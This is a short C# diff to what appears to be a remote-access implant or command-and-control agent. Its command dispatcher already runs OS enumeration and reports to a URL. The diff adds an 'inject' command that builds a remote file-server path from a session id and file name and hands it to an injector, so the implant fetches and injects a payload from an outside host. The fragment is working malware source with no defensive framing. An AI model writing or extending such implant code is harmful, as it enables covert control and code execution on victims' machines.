@@ -83,14 +83,18 @@ namespace CursedSpaghetti
         }
 
         // Choose Weapon
-        public static void ChooseWeapon(string url, string weapon)
+        public static void ChooseWeapon(string fs_url, string url, string weapon, string sessionid)
         {
             weapon = weapon.Substring(7);
 
-            switch (weapon.ToLower())
+            switch (weapon.Split(' ')[1].ToLower())
             {
                 case "basicenum":
                     Gatherer.ListBasicOSInfo(url);
+                    break;
+                case "inject":
+                    string targetFile = weapon.Substring(7).Replace(" ", "");
+                    Injector.Inject(String.Format("{0}/{1}/{2}", fs_url, sessionid, targetFile));
                     break;
                 default:
                     Post(url, "#!#Weapon does not exist");
